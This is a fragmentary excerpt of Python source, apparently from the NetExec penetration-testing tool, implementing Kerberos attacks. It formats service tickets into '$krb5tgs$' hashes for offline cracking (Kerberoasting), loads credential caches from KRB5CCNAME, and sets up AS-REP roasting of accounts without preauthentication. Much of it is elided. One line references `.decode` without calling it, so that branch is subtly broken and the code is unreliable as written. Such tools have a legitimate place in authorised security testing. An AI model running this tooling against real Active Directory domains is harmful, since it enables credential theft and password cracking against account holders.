...
class KerberosAttacks:
    ...
    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
        ...
        if (
            ...
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                ...
                spn.replace(":", "~"),
                hexlify(
                    decoded_tgs["ticket"]["enc-part"]["cipher"][:16].asOctets()
                ).decode(),
                hexlify(
                    decoded_tgs["ticket"]["enc-part"]["cipher"][16:].asOctets()
                ).decode(),
            ...
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                ...
                spn.replace(":", "~"),
                hexlify(
                    decoded_tgs["ticket"]["enc-part"]["cipher"][-12:].asOctets()
                ).decode(),
                hexlify(
                    decoded_tgs["ticket"]["enc-part"]["cipher"][:-12:].asOctets()
                ).decode,
    ...
    def get_tgt_kerberoasting(self, kcache=None):
        if kcache:
            if getenv("KRB5CCNAME"):
                nxc_logger.debug(
                    "KRB5CCNAME environment variable exists, attempting to use that..."
                )
                try:
                    ccache = CCache.loadFile(getenv("KRB5CCNAME"))
                    # retrieve user and domain information from CCache file if needed
                    domain = (
                        ccache.principal.realm["data"]
                        if self.domain == ""
                        else self.domain
                    )
                ...
                nxc_logger.fail(
                    "KRB5CCNAME environment variable not found, unable to use Kerberos Cache"
                )
    ...
    def get_tgt_asroast(self, userName, requestPAC=True):
        ...
        try:
            ...
            nxc_logger.debug(
                f"User {userName} doesn't have UF_DONT_REQUIRE_PREAUTH set"
            )
            return None
